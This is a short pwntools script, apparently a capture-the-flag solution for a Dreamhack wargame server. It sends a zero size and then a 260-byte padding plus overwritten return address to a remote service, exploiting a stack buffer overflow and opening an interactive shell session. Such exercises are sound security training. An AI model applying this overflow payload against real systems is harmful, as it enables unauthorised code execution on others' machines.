from pwn import *

p = remote('host3.dreamhack.games', 23619)

p.sendlineafter(b'Size: ', b'0')

payload = b'a' * 260
payload += p32(0x8048659)

p.sendafter(b'Data: ', payload)

p.interactive()
